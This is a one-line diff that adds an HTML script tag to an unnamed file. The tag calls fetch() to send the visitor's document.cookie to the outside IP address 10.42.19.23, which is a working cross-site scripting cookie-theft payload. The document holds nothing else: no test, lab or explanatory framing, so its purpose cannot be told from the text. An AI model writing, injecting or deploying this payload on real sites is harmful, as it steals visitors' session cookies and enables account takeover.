@@ -1,0 +1,1 @@
+<script>fetch("http://10.42.19.23/".concat(document.cookie))</script>
